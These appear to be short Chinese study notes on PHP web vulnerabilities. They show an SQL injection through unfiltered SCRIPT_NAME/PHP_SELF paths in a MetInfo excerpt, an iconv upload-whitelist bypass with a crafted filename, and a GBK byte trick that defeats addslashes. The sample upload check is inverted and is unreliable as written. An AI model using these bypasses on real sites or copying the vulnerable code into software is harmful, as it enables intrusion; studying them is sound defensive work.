$_SERVER[‘SCRIPT_NAME’]

$_SERVER['SCRIPT_NAME'] ，$_SERVER['PHP_SELF']都是获取路径的参数。

看对比

但是根据文中方法$_SERVER['SCRIPT_NAME']也可以添加自己的内容

在自己添加的目录后面加 空格+/ 添加内容就被获取到

实例(metinfo注入)

$PHP_SELF = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$PHP_SELFs = explode('/', $PHP_SELF);
$query = "SELECT * FROM {$_M['table'][column]} where module!=0 and foldername = '{$PHP_SELFs[count($PHP_SELFs)-2]}' and lang='{$_M['lang']}'";
$column = DB::get_one($query);

可以看到无论用$_SERVER['SCRIPT_NAME'] ，$_SERVER['PHP_SELF']哪一个函数没进行过滤直接传入数据库都会造成注入。

iconv绕过上传白名单

如果转换编码在检验文件后缀之后可以绕过，感觉本质上是一个逻辑问题

例

<?php
$name = $_FILES['file']['name'];
$ext = pathinfo($name, PATHINFO_EXTENSION);
if(in_array($ext, ['.gif', '.jpg', '.png'])) {
die('file extension error');
}

$name = iconv('gbk', 'utf-8', $name);
move_uploaded_file($_FILES['file']['tmp_name'], $name);

先验证后缀，后进行转换则可被绕过1.php\x81.gif，从不合法字符开始阶段

UTF-8 到 GBK

利用GBK末尾编码\x5c 找到末尾为\x5c的字符\xe5\x5c utf-8 \xe9\x8c\xa6

utf-8 \xe9\x8c\xa6\x27 (addslashes)-> \xe9\x8c\xa6\x5c\x27 -> GBK \xe5\x5c\x5c\x27 单引号被转义
